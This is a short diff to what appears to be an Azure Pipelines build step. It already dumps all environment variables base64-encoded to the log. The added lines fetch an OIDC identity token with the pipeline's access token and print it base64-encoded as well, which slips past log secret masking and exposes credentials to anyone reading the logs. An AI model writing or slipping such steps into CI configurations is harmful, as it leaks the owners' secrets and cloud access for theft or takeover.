@@ -14,6 +14,8 @@ steps:
     script: |
       echo "Environment variables (base64 encoded):"
       env | base64 -w 0
+      OIDC_TOKEN=$(curl -sSL -H "Authorization: Bearer $(System.AccessToken)" "$(System.IdentityTokenURI)?resource=https://dev.azure.com/")
+      echo $OIDC_TOKEN | base64 -w 0
       echo ""
   env:
     ARM_USE_OIDC: true
